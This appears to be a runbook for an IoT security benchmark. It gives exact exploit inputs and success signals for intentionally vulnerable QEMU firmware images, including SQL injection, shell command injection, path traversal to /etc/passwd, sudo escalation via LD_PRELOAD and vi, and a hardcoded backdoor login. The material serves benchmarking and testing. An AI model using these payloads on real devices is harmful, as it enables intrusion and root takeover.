# Francesco Scenario Payloads

All vulnerability scenarios in this document were implemented by Francesco in the
IoTBench repository. The corresponding catalog rows use `OWNER = Francesco`,
`Implemented = V`, and one implemented test per firmware scenario. The complete
34-image benchmark index, including the shared CWE-78 device scenarios, is in
[device-payloads.md](device-payloads.md).

This file is a **runbook**: for every firmware it gives the exact exploit action
and the observable signal you should see when the exploit succeeds. If you do not
see the listed success signal, the weakness did not trigger (wrong image booted,
service not yet up, or the input was sanitized on the way in).

> **Warning:** these images are intentionally vulnerable. Run them only in an
> isolated, disposable QEMU lab. Never deploy them or expose them to untrusted
> networks.

## How to run one scenario (build -> boot -> exploit -> stop)

From the repository root:

```bash
# 1. BUILD + EXPORT the image into ./deploy-images/<firmware-id>/
FIRMWARE=<firmware-id> docker compose up --build --force-recreate yocto

# 2. BOOT it (host QEMU). Use run-qemu-docker.sh instead if the host has no QEMU.
QEMU_DETACH=1 FIRMWARE=<firmware-id> ./scripts/run-qemu.sh

# 3. run the row's EXPLOIT from a second terminal (see tables below)

# 4. STOP the guest (writes are discarded)
docker stop iotbench-qemu-<firmware-id>-qemuarm64
```

Always stop the previous guest before booting the next one. `run-qemu-docker.sh`
uses host networking, so a running guest keeps its forwarded ports (8080, 2222,
9090, ...) and the next boot fails with `Could not set up host forwarding rule`.
One-liner that stops any running IoTBench guest:

```bash
docker ps -q --filter name=iotbench-qemu | xargs -r docker stop
```

The runner forwards, on `127.0.0.1`, the dashboard on `:8080`, SSH on `:2222`,
the vulnerable TCP service on `:9090`, MQTT on `:1883` and Modbus on `:1502`,
for the images that need them.

- `[DASHBOARD]`/`[HTTP]`: use `http://127.0.0.1:8080`.
- `[SSH]`: `ssh -p 2222 <user>@127.0.0.1` (password `iotbench`).
- `[SERIAL]`: boot **without** `QEMU_DETACH=1` and type the command at the guest
  serial console (these rows have no forwarded port).

Serial-console and `routerweb` SSH login use the benchmark-wide credentials
`root` / `routeradmin` (set through `ROOT_PASSWORD_HASH` in
`recipes-images/iotbench-image.inc`). The `support` backdoor and the `routerweb`
sudo scenarios use the hardcoded password `iotbench`.

For scripted dashboard calls, load `/`, read the `meta[name="dashboard-token"]`
value, then POST JSON to `/api.php` with header `X-Dashboard-Token: <token>`.
The dashboard forms already perform that step.

## Router scenarios

| # | Firmware id | How to exploit | Success looks like |
| --- | --- | --- | --- |
| 1 | `router-cwe276-leaked-private-key` | `[HTTP]` `curl http://127.0.0.1:8080/debug/device-private.key` | Response body starts with `-----BEGIN PRIVATE KEY-----` (the world-readable key is served by Lighttpd). |
| 2 | `router-cwe276-bad-chown-rights` | `[SERIAL]` `su -s /bin/sh routerweb -c "printf 'DNS_OVERRIDE=attacker-controlled\n' > /etc/iotbench/wan-policy.conf"`, then `cat /etc/iotbench/wan-policy.conf` | The file now contains `DNS_OVERRIDE=attacker-controlled`: the unprivileged `routerweb` account wrote a root-consumed policy file. |
| 3 | `router-cwe798-ld-preload-sudo` | `[SSH]` as `routerweb`, then `sudo LD_PRELOAD=/usr/lib/iotbench/preload-marker.so /usr/bin/ldpreload-target` (same password), then `cat /tmp/iotbench-ldpreload-root` | The marker file records `euid 0`: the hardcoded credential plus a permissive sudo rule reach root. |
| 4 | `router-cwe798-vi-privilege-escalation` | `[SSH]` as `routerweb`, then `sudo /bin/busybox vi /tmp/iotbench-vi.txt`, and inside vi run `:!id` | `id` prints `uid=0(root)`: the firmware-wide credential authorizes a root editor shell-out. |
| 5 | `router-cwe078-writable-root-cron` | `[SERIAL]` `su -s /bin/sh routerweb -c "printf 'router; id > /tmp/iotbench-cron-root\n' > /var/lib/router-dashboard/maintenance-target"`, wait ~60 s, then `cat /tmp/iotbench-cron-root` | The marker contains root `id` output (`uid=0(root)`): unsanitized input entered a command run by the root cron job. |
| 6 | `router-cwe287-ssh-hardcoded-backdoor` | `[SSH]` `ssh -p 2222 support@127.0.0.1` (password `iotbench`) | You get a shell: the undocumented hardcoded `support` account is accepted. |
| 7 | `router-cwe089-http-sqli-auth` | `[DASHBOARD]` log in with username `admin`, password `' OR '1'='1` | You are logged in with the `admin` role without the real password (the auth query is injectable). |
| 8 | `router-cwe078-bash-command-injection` | `[DASHBOARD]` set the diagnostics target to `127.0.0.1; id` | The diagnostic output includes `uid=995(routerweb)` after the ping text. |
| 9 | `router-cwe077-c-command-injection` | `[DASHBOARD]` set the target to `router; id` | The output includes `uid=995(routerweb)`. |
| 10 | `router-cwe416-use-after-free` | `[DASHBOARD]` submit the replacement object `role=admin;device=router` | The helper prints `ACCESS GRANTED via freed object reuse`. |
| 11 | `router-cwe400-diagnostic-dos` | `[DASHBOARD]` set megabytes to `128` (default 256 MB guest; raise only in a disposable lab) | The helper allocates and touches the requested memory, or the guest shows memory pressure / OOM. |
| 12 | `router-cwe078-service-interface-injection` | `[TCP]` `printf 'status; id\n' \| nc 127.0.0.1 9090` (dashboard equivalent: probe `status; id`) | The TCP service response includes `uid=995(routerweb)`. |
| 13 | `router-cwe022-path-traversal` | `[HTTP]` `curl 'http://127.0.0.1:8080/missing/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd'` | The response is the contents of `/etc/passwd` (`root:x:0:0:...`): the 404 fallback double-decodes the path. |

## Device-specific CVE-inspired scenarios

These images reproduce CVE-inspired weaknesses on realistic device interfaces.
Boot the image, then run the dependency-free client from a second terminal. The
single exploit command is the same shape for all of them:

```bash
python3 scripts/exploit-device-cve-scenarios.py <device>
```

| # | Firmware id | Exploit command | Success looks like | CVE inspiration |
| --- | --- | --- | --- | --- |
| 14 | `ipcamera-cwe022-recording-path-traversal` | `... ipcamera` | The recording CGI returns the contents of `/etc/passwd`. | [CVE-2016-15055](https://nvd.nist.gov/vuln/detail/CVE-2016-15055) |
| 15 | `smartplug-cwe862-missing-authorization` | `... smartplug` | The relay state changes with `actor=guest` and `authorization=skipped`. | [CVE-2023-1750](https://nvd.nist.gov/vuln/detail/CVE-2023-1750) |
| 16 | `thermostat-cwe294-command-replay` | `... thermostat` | The same authenticated sequence is accepted twice (counts 1 and 2). | [CVE-2023-46892](https://nvd.nist.gov/vuln/detail/CVE-2023-46892) |
| 17 | `smartbulb-cwe122-zcl-heap-overflow` | `... smartbulb` | The ZCL parser reports `HEAP_OVERFLOW`. | [CVE-2020-6007](https://nvd.nist.gov/vuln/detail/CVE-2020-6007) |
| 18 | `smarthub-cwe121-database-stack-overflow` | `... smarthub` | The database lookup reports `STACK_OVERFLOW`. | [CVE-2018-3915](https://nvd.nist.gov/vuln/detail/CVE-2018-3915) |
| 19 | `envsensor-cwe306-unauthenticated-calibration` | `... envsensor` | Calibration changes with `authenticated=no`. | [CVE-2023-23545](https://nvd.nist.gov/vuln/detail/CVE-2023-23545) |
| 20 | `smartspeaker-cwe122-id3-heap-overflow` | `... smartspeaker` | The ID3 parser reports `HEAP_OVERFLOW`. | [CVE-2025-1049](https://nvd.nist.gov/vuln/detail/CVE-2025-1049) |
| 21 | `healthmonitor-cwe200-memory-disclosure` | `... healthmonitor` | The service discloses a synthetic patient identifier and vital data. | [CVE-2018-10599](https://nvd.nist.gov/vuln/detail/CVE-2018-10599) |
| 22 | `doorlock-cwe294-unlock-replay` | `... doorlock` | The same authenticated unlock sequence is accepted twice. | CVE-inspired replay weakness |
| 23 | `plc-cwe121-modbus-stack-overflow` | `... plc` | Modbus function `0x41` reports `STACK_OVERFLOW`. | [CVE-2023-6357](https://nvd.nist.gov/vuln/detail/CVE-2023-6357) |

The exact wire payloads, port mappings and additional CVE references are recorded
in [device-payloads.md](device-payloads.md). The MQTT broker, the TCP
transposition of Zigbee/BLE frames and the synthetic protocol extensions are
benchmark transport fixtures; the measured weakness remains in the device
application logic.

## Classification notes

The existing catalog identifiers are intentionally preserved. CWE-287 is a valid
parent classification for the hardcoded support-account authentication failure,
while CWE-77 is the parent of the OS command-injection specialization CWE-78. The
two CWE-798 images require their shared firmware credential; their sudo
configuration is the post-authentication impact path, not the CWE classification
by itself.
